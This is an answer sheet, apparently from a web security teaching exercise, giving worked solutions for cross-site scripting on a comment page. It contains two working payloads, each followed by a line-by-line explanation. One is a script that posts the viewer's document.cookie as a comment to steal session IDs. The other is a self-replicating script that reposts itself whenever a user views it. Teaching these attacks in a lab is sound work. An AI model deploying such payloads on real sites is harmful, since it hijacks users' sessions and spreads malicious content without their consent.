Answer Sheet
============

Using Javascript to steal the session ID
----------------------------------------

.. code:: javascript

  <script>
    jQuery.post(
      "?page=comment.php",
      {
        "article_id": 1,
        "body": "My cookies are: " + document.cookie
      }
    )
  </script>


* ``document.cookie`` is the string containing the users' cookies.
  You can learn more about this string and its format
  at https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie.


Extension Challenge
----------------------------------------

.. code:: javascript

  This comment will be shared automatically by every user
  who views the page...!

  <script class="evil-script">
    jQuery.post(
      "?page=comment.php",
      {
        "article_id": 1,
        "body": jQuery(".evil-script").first().parent().html()
      }
    )
  </script>


* ``jQuery`` can be used as a function to search the document,
  and it returns a list of elements found using the selector string.
  The dot (``.evil-script``) at the beginning of
  the string is used to search for elements by class name.
  You can learn more about this function at http://api.jquery.com/jquery/.

* ``.first()`` is used to get only the first occurrence of the script,
  in case the page contains other scripts (or many copies of the script).

* ``.parent()`` is used to get the container of the comment, which
  includes both the script and the rest of the text of the comment.

* ``.html()`` is used to get the source code of the tag, including
  its Javascript content.

* ``This comment will be shared automatically...`` is the text of the payload
  message that will be visible to users and will be reshared automatically.
